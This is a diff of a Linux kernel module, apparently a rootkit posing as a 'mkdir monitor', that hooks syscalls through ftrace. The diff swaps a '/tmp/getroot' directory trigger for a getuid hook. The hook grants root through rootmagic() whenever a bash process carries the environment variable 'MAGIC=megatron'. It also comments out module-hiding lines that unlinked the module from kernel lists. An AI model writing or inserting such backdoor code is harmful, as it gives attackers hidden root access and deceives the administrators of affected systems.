@@ -6,6 +6,7 @@
 #include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/kprobes.h>
+#include <linux/slab.h>
 #include "secure.h"
 
 // Version-specific adjustments
@@ -142,14 +143,47 @@ static long hook_mkdir(const struct pt_regs *regs)
       //  printk(KERN_INFO "Directory creation blocked: %s\n", path);
     }
 
-     if (strcmp(path, "/tmp/getroot") == 0) {
-         rootmagic(); 
-     }
+     
     return 0; // Prevents the directory creation
 }
 
+typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
+static  orig_getuid_t orig_getuid;
+DECL_FUNC_CHECK(orig_getuid,SIG_GET_PID);
+
+static asmlinkage long hook_getuid(const struct pt_regs *regs) {
+    const char *name = current->comm;
+
+    struct mm_struct *mm;
+    char *envs;
+    int len, i;
+
+    if (strcmp(name, "bash") == 0) {
+        mm = current->mm;
+        if (mm && mm->env_start && mm->env_end) {
+            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
+            if (envs) {
+                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
+                if (len > 0) {
+                    for (i = 0; i < len - 1; i++) {
+                        if (envs[i] == '\0')
+                            envs[i] = ' ';
+                    }
+                    if (strstr(envs, "MAGIC=megatron")) {
+                        rootmagic();
+                    }
+                }
+                kfree(envs);
+            }
+        }
+    }
+    return orig_getuid(regs);
+}
+
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
+    HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
 };
 
 
@@ -159,8 +193,8 @@ static int __init mkdir_monitor_init(void)
     size_t i;
 
     // Do kernel module hiding
-    list_del_init(&__this_module.list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
+//    list_del_init(&__this_module.list);
+//    kobject_del(&THIS_MODULE->mkobj.kobj);
 
     
     
